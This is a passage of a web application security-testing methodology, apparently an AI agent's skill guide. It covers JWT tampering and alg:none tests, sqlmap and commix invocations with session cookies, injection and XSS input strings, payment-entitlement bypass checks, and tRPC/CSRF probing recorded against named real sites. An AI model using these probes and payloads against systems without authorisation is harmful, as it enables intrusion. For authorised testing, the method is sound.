  "missing write idempotency (UI path)", note the API parity gap.

### 9j. JWT signature verification — prove it with 401-vs-403, not with the algorithm name

"alg is RS256" tells you nothing about whether the server *checks* it. The decisive test is what
happens to a tampered token versus a valid token used against a foreign object:

| Request | Expected if signature IS enforced |
|---|---|
| valid token, own object | `200` |
| payload tampered, signature kept | **`401`** (signature failed) |
| `alg:none` header + empty signature | **`401`** |
| valid token, **foreign** object id | **`403`** (signature good, authorization refused) |

The 401/403 **split** is the proof. Without the 403 row you cannot tell "the signature is checked" from
"everything returns 401". Always run all four; rows 3 and 4 together are the finding (or the verified
negative).

```python
# payload swap, keep the original signature
pl2 = dict(payload); pl2["member"] = {"id": "1"}
b64e(json.dumps(pl2).encode()) + "." + orig_sig                    # -> 401 means checked
# alg:none
b64e(b'{"typ":"JWT","alg":"none"}') + "." + b64e(payload) + "."    # -> 401 means checked
```

Pitfalls:
- **A single flat status is not evidence.** One backend answered `409 logout` for control, tampered and
  `alg:none` alike — no oracle, so the honest verdict is *unproven*, not *secure*. Say which it is.
- Tampering the payload also breaks any server-side session lookup keyed on the token's own claims, so a
  `401` can mean "unknown session" rather than "bad signature". The foreign-object `403` row is what
  disambiguates.
- If the token lives in a per-app **cookie** (e.g. `tokens`, `wl_tokens`), re-send it as both the cookie
  and a bearer header — different layers of the stack read different ones.
- **A login endpoint that returns the token in the response body may not set the cookie at all** for your
  client; set it yourself (`s.cookies.set("tokens", tok, domain=host, path="/")`) before concluding the
  session is broken.

## 10. TOOL-AIMING DISCIPLINE — "executed" ≠ "tested the right surface"

The single biggest source of a false "clean" verdict is running a real tool at the
**wrong target**: a root URL or a static page **without parameters**, and/or **without a
session**. The tool reports success and "0 findings" while testing nothing. A user WILL
call this out ("did you actually aim the tools at the target, or just curl?"). Before
reporting zero, open each tool's evidence file and grep for these silent no-ops:

| Silent no-op string | Means |
|---|---|
| `no parameter(s) found for testing` | sqlmap tested nothing (no `?param=`) |
| `unknown command` | wrong CLI form (e.g. `dalfox <url>`) |
| `unrecognized arguments` | wrong flag (e.g. CORScanner `--headless`) |
| `required: -r, -p` | SSRFmap refused (needs a raw request file + param) |
| `does not seem to be injectable` **on the root** | the param set was empty |
| `0 matches` with a tiny HTTP-connection count | scan never reached the app |

Correct targeting recipe for a modern SPA/Next.js target:
1. Build an **authed URL list** (real routes with real query params, e.g. `?ty=`,
   `?sourceType=`, `?tab=`, `/api/...`) — not the home page.
2. Pass the **session cookie** to every tool (`-H "Cookie: ..."`, `--cookie`, dalfox
   `--header`).
3. Aim **sqlmap** at a param URL: `sqlmap -u "...?ty=2026-27" --cookie "<jar>" --level 3
   --risk 2 --technique=BEUST`. It ALSO tests Cookie/User-Agent/Referer params — watch
   for those verdicts too.
4. Aim **commix** at the same param URL with `--cookie`; a run of
   `false positive / unexploitable injection point` with **0 confirmed** = not injectable.
5. **dalfox** correct CLI = `dalfox url <URL>` or `dalfox file <list>` (a bare
   `dalfox <URL>` prints `unknown command` and scans nothing). Add `--header "Cookie: ..."`.
6. **ffuf** param-VALUE fuzz (`-w payloads.txt` on `?ty=FUZZ`) + param-NAME fuzz
   (`?FUZZ=1`) + a **size-differential** pass; a flat size profile across all payloads =
   the value is validated/ignored downstream.
7. **arjun** for hidden params (needs `-u`; feed `--headers "Cookie: ..."`).

Tool setup fixes that unblock a real run (capture the FIX, not "the tool is broken"):
- **commix on Python 3.13/3.14**: crash `module 'collections' has no attribute 'Callable'`
  via pyreadline → `pip uninstall -y pyreadline pyreadline3` (fall back to native readline),
  then `python commix.py --url=... --batch`. A working run prints
  `false positive or unexploitable injection point`, not a traceback.
- **amass** build here rejects `-o` (`flag provided but not defined: -o`); omit it and read
  the default output location.
- Prefer an installed CLI over hand-rolled `urllib`; if a tool version is too old for the
  local Python (e.g. `nosqlmap` py2 `print` syntax), say so as a coverage gap — do not
  silently substitute curl and call it coverage.

## 11. PRO-GATING / PAYMENT-ENTITLEMENT BYPASS ASSESSMENT

Class-level check for any SaaS with a paid tier (fintech, MTD/tax, subscriptions):
**can the paid entitlement be obtained without a verified payment?** Test ONLY the
design/entitlement path — never complete a fake payment or forge a live value; that is
fraud, not research, regardless of claimed authorisation. State the boundary explicitly
if asked to "fake payment" and offer the legitimate entitlement test instead.

Test matrix (all read-only w.r.t. money):
1. **Client-trusted flags** — hit the return/success URLs yourself:
   `?success=1`, `?checkout=success`, `?session_id=cs_FAKE`, `/app/billing/success`,
   `?upgraded=true`, `?plan=pro`. Re-fetch `/app/account` (or the export JSON) and assert
   the plan is UNCHANGED. A plan that flips from a query param = client-trusted = finding.
2. **Field tampering** on the checkout action — inject `plan`, `price`, `amount=0`,
   `trial`, or an odd `interval` (`lifetime_free`). Bound args are usually validated
   server-side → no effect. Confirm via the account/export source of truth.
3. **Webhook signature** — find `POST /api/stripe/webhook` (GET → 405, invalid POST → 400).
   Send a well-formed `Stripe-Signature: t=<ts>,v1=<hmac>` with a random secret, plus
   `missing`/`garbage`/`v0`-only variants. `{"error":"invalid signature"}` / `missing
   signature` on ALL variants = HMAC verified against the real secret = **correct**.
4. **Source of truth** — the entitlement must be readable from a server-side field
   (`/api/account/export` JSON `account.plan`, or the account page), never inferred from a
   button label. Assert it stays `free` after every bypass attempt.
5. **Enumerate sibling webhook paths** (`/api/webhooks/stripe`, `/api/billing/webhook`, …)
   — 404 everywhere except the signature-gated one is the expected, good result.

Correct outcome to write up: "entitlement is conferred only by a signature-verified
webhook; client flags/return URLs/field tampering have no effect — payment design secure."

## 12. FREE-TIER BUSINESS-LOGIC / CALCULATION REVIEW (ground truth via export)

For finance/tax/ledger apps, the free-tier *calculation* (not just authz) is a real bug
class. Verify against a **machine-readable export** (XLSX/CSV/JSON), never the rendered
page (the page paginates and shows the same figure twice).

Method:
1. **Clean-room, known inputs** — a fresh account with a short controlled dataset so you
   can compute the expected total by hand.
2. **Precision** — money should be stored as integer pence. `0.01 × 3` must total exactly
   `0.03` (any float drift = finding). Check the export, not the label.
3. **Tax-year boundary mapping** (the classic off-by-one trap for MTD/UK tax years):
   insert entries with UNIQUE values on each boundary day — `05 Apr` (last day) and
   `06 Apr` (first day) of consecutive years — then export per `taxYear` and confirm each
   value lands in the RIGHT year. `06/04/<Y>` → year `<Y>-<Y+1>`; `05/04/<Y>` → the
   PREVIOUS tax year. Also confirm no value appears in two years (double-count).
4. **Idempotency** — resubmit with the SAME `submissionId` and confirm dedup (count via
   export, not page). Contrast with the API's idempotency key if one exists.
5. **Numeric edge cases** on the amount field: negative, zero, `> £100,000,000`,
   `> 2 decimals`, empty, `1e5`, `NaN`, `Infinity`, `1';DROP--`, `<img onerror>`,
   non-ASCII digits, thousands separators, currency symbol, leading/trailing space.
   Record accept/reject and the exact error string.
6. **Category/type mismatch** — `expense` with an income category, bogus/empty/case-variant
   category → expect "Choose a valid category".

**Self-debunk before claiming a calculation bug.** A "missing entries" observation was
pagination; a "SSTI `49`" was a baseline year/price already in the page. Always (a) run a
**baseline** request without your payload and (b) confirm from an independent export. If
the boundary mapping and precision are correct, write it up as a **verified negative** with
the per-year totals as evidence — that is a deliverable, not a non-result.

## 13. tRPC API Surface Mapping (multi-tenant SaaS)

Verified on coderabbit.ai (2026-10). Many modern SaaS backends are **tRPC**, not REST. The
whole surface maps from error messages plus the app's own network traffic — no guessing.

### Fingerprint (one request)
```
GET /api/<any-router>/<any-proc>
→ {"error":{"message":"No procedure found on path \"<proc>\"","code":-32004,
   "data":{"code":"NOT_FOUND","httpStatus":404,"path":"<proc>"}}}
```
That envelope (`code:-32004` / `NOT_FOUND` / `path`) is tRPC. A missing tenant header gives
`-32600 BAD_REQUEST` with the header name in the message (e.g. "Organization header required") —
the error tells you the auth model.

### Multi-tenant headers come from the app's own requests
Tenant context is client-sent headers. Capture them once from the authenticated app
(`Network.requestWillBeSent` or Playwright request headers), e.g.
`x-<vendor>-organization: <uuid>`, `x-<vendor>-workspace: <uuid>`, plus integration ids
(`x-github-installation-id`). Replay every probe with those headers or you get 400/412.

### Procedure discovery — three cheap sources
1. **Error messages**: unknown procedure on a real router → 404 naming the path; unknown
   router → falls through to the SPA HTML (200 doctype). That difference tells you which
   router names are real.
2. **The app's own batch calls**: tRPC batches as
   `/api/<router>/<p1>,<p2>?batch=1&input=<urlencoded json>` — one captured batch request
   reveals several procedure names at once (seen: `getTriageOnboardingState,getRepositoryAccess`).
3. **Route navigation**: SPA routes lazy-load the chunk that owns their procedures. Visit
   each real route (`/settings/...`, `/triage`, `/code/new`) and capture `/api/` calls; the
   app calls its own procedures for you. Dump the route map first from
   `[...document.querySelectorAll('a,button')].map(e=>e.href)` on the authenticated shell.

### JS chunk extraction (when navigation is not enough)
Collect `script` URLs from a data-heavy route (hundreds of lazy chunks), download
concurrently, grep for `/api/<router>/<proc>` patterns and quoted procedure-shaped strings
(`"(get|list|create|update|set|assign|invite)[A-Z][a-zA-Z]{3,45}"`). Zod schemas leak the
input shape too — an object-locator param appeared verbatim as
`locator: u({provider:…,owner:…,repo:…,prNumber:…})`, which is the IDOR candidate's exact
format.

### Pitfalls
- **Precondition gates are controls, not bugs**: `412 {"error":"Repository access must be
  refreshed before loading Triage"}` = server-side state check working. Record as verified.
- **ID format validation before lookup** (modified/random IDs → `400 Invalid ID`) kills the
  enumeration oracle — document it as a control.
- **Object-locator params are the IDOR test**: once you know the locator shape
  (`{provider,owner,repo,prNumber}`), probe with a foreign owner/repo. If the exact request
  transport resists (endpoint keeps answering "Missing or invalid task locator" for every
  query/body/header variant), say "format partially mapped, transport not cracked" — do not
  claim either a bug or a clean bill.
- A **default nginx page** on the API host root (`Welcome to nginx!`, `nginx/x.y.z`) is a
  minor misconfiguration/info-disclosure note, not a finding on its own.
- SPA catch-all returns the app HTML (200 doctype) for any unknown `/api/...` path — a 200
  HTML body is "route not found", never an API response.

### CSRF on tRPC mutations — cookie/header split (cost ~15 requests to reverse)

tRPC mutations on a Next.js app are CSRF-protected, and the token is **split across two
places with different encodings**. Getting this wrong yields `403 CSRF token mismatch`
(never a plain 403), which reads like an authz failure and wastes a long time.

Measured on hub.stay22.com (better-auth session, 2026-10):

| Where | Value |
|---|---|
| Cookie `hub.csrf-token` | **full** value, URL-decoded: `<hashA>|<hashB>` |
| Header `x-csrf-token` | **`<hashA>` only** — the part BEFORE the `|` |
| Header `x-trpc-source` | `nextjs-react` |
| `Origin` / `Referer` | must be the app origin |

```python
csrf = urllib.parse.unquote(cookie_jar["hub.csrf-token"])   # decode %7C -> |
headers = {
    "x-csrf-token": csrf.split("|")[0],      # header = first half ONLY
    "x-trpc-source": "nextjs-react",
    "Content-Type": "application/json",
    "Origin": "https://hub.<target>", "Referer": "https://hub.<target>/",
}
# cookie keeps the FULL value
```
Diagnostic ladder (each error names the next step):
- `CSRF token missing` → you sent neither; the token is NOT auto-added by `fetch` from the page.
- `CSRF cookie invalid` → you sent only the first half as the cookie.
- `CSRF token mismatch` → cookie/header split is wrong (usually header got the full value).

Recover the exact wire format from the bundle rather than guessing — grep the lazy chunks for
`x-csrf-token` / `x-trpc-source` / `getCookie(`:
```python
# chunks are listed in the page's <script src> tags; download and grep
re.findall(r'["\']([\w\-]{2,60}-[A-Z0-9]{8}\.js)["\']', bundle_text)
```
**Refresh the cookie before use** — it rotates with the session, so a value scraped earlier in
the run is stale. Re-navigate the app once, then read it from the live context.

### Zod schema discovery — drive it from the error message

tRPC + Zod returns the required-field list as a **JSON string nested inside the error
message**. Parse it, auto-fill, repeat — the schema assembles itself in a few requests with no
bundle reading:

```python
def parse_errs(text):
    outer = json.loads(text)                      # [{"error":{"json":{"message": "<json str>"}}}]
    arr = json.loads(outer[0]["error"]["json"]["message"])
    return [(e.get("path", []), e.get("expected")) for e in arr]

cur = {"groupId": MYG, "payload": {}}
for _ in range(12):
    r = post("scripts.create", cur)
    if r.status_code == 200:
        break
    for path, exp in parse_errs(r.text):
        val = [] if exp == "array" else ({} if exp == "object" else
              (False if exp == "boolean" else (0 if exp == "number" else "x")))
        node = cur
        for p in path[:-1]:
            node = node.setdefault(p, {})
        node[path[-1]] = val
```
Two error shapes appear — handle both:
- **Zod** (`code:-32600`): `message` is a JSON array with `path`/`expected` per field.
- **AJV / JSON-schema** (`code:-32600`, `"request/body must have required property 'x'"`):
  a plain string; add the named property and re-send.

### Distinguishing real authz from a malformed request

A `403 "The user has no access to this group"` is only meaningful if the **same request shape
succeeds against your own object**. Always run the control first:

```
CONTROL  maps.create {groupId: MINE}   -> 200 (or 400 on a deeper field) = request is well-formed
TEST     maps.create {groupId: OTHER}  -> 403 "no access to this group" = authz enforced
```
If the control stops at a *deeper* validation error than the test does, the authz check runs
**before** body validation — that ordering is itself the proof the 403 is authorization, not
a parse failure. Record both rows.

### Client-validated fields that are NOT persisted server-side

When a mutation accepts a field the UI never sends (e.g. `gid`, `creator`, `_id` injected into
a `map` object), check whether it **survives the round-trip** (`read back via the list
procedure`) and then whether **anything consumes it**. A field that persists but is referenced
by no front-end bundle and no public read path is an input-validation gap, not a finding —
say so explicitly rather than filing a stored-XSS/IDOR guess. Confirm the sink before claiming
impact: React auto-escapes text nodes, so a `<script>` value rendered into a table cell is
inert (verified: 0 injected script elements, 0 dialogs).

## Reference
- Full OTP-lockout matrix + duplicate-race reproduction detail →
  `references/otp-lockout-and-duplicate-race.md`
- Tool-aiming + free-tier logic review evidence (this session's QuarterWise re-audit:
  commix false-positive run, sqlmap "not injectable", tax-year boundary table, payment
  webhook matrix) → `references/tool-aiming-and-entitlement-review.md`

